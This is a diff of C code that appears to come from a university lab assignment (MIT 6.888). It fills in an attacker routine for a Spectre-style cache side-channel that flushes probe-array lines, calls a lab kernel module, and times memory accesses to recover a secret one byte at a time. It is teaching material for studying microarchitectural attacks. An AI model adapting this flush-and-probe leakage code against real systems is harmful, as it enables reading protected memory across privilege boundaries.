@@ -42,9 +42,12 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     size_t current_offset = 0;
 
     printf("Launching attacker\n");
+    printf("Shared memory: %p\n", shared_memory);
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
+        char min_idx;
+        size_t min_val = 1000000;
 
         // [6.888 Part 1]- Fill this in!
         // Feel free to create helper methods as necessary.
@@ -52,27 +55,42 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Find the value of leaked_byte for offset "current_offset"
         // leaked_byte = ??
 
-        for (int i = 0; i < 128; i++) {
-            call_kernel_part1(kernel_fd, shared_memory, 0);
+        // printf("Train\n");
+        // for (size_t i = 0; i < 128; i++) {
+        //     call_kernel_part1(kernel_fd, shared_memory, 0);
+        // }
+
+        // printf("Flush\n");
+        for (size_t j = 0; j < 256; j++) {
+            clflush((void *)(shared_memory + (j * 4096)));
         }
 
-        for (int i = 0; i < 128; i++) {
-            clflush((void *)(shared_memory + (i * 4096)));
-        }
-
+        // printf("Call\n");
         call_kernel_part1(kernel_fd, shared_memory, current_offset);
 
-        for (char i = 0; i < 128; i++) {
+        // printf("Probe\n");
+        for (size_t k = 0; k < 128; k++) {
             int access_time;
 
-            access_time = time_access((void *)(shared_memory + (i * 4096)));
-            printf("access_time: %d\n", access_time);
+            access_time = time_access((void *)(shared_memory + (k * 4096)));
+            // printf("access_time[%d]: %d\n", i, access_time);
 
-            if (access_time < 100) {
-                leaked_byte = i;
-                break;
+            if (access_time < min_val) {
+                min_val = access_time;
+                min_idx = k;
             }
+
+            // if (access_time < 75) {
+            //     leaked_byte = k;
+            //     printf("leaked_byte: %c\n", leaked_byte);
+            //     break;
+            // }
         }
+
+        printf("min_val: %d\n", min_val);
+
+        leaked_byte = min_idx;
+        printf("leaked_byte: %c\n", leaked_byte);
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
